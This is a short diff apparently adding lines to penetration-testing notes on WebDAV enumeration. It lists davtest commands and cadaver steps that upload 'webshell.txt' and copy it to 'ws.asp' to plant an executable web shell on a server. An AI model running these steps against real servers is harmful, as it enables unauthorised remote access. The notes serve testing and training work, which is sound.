@@ -1,1 +1,7 @@
+davtest -url <URL>
 
+WebDAV Enumeration
+davtest -cleanup -url http://$IP
+cadaver http://$IP
+    dav:/> put webshell.txt
+    dav:/> copy webshell.txt ws.asp
